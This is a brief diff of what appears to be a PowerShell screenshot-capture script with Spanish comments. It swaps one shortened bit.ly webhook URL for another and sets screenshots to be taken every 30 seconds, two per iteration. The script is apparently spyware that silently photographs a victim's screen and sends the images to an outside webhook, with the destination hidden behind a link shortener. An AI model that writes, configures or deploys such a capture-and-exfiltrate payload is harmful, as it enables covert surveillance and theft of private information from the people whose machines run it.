@@ -1,5 +1,5 @@
 # URL del webhook
-$hookurl = "https://bit.ly/web_chupakbras"
+$hookurl = "https://bit.ly/3UvuA7F"
 $seconds = 30 # Intervalo entre capturas de pantalla
 $a = 2 # Cantidad de capturas de pantalla por iteración
 
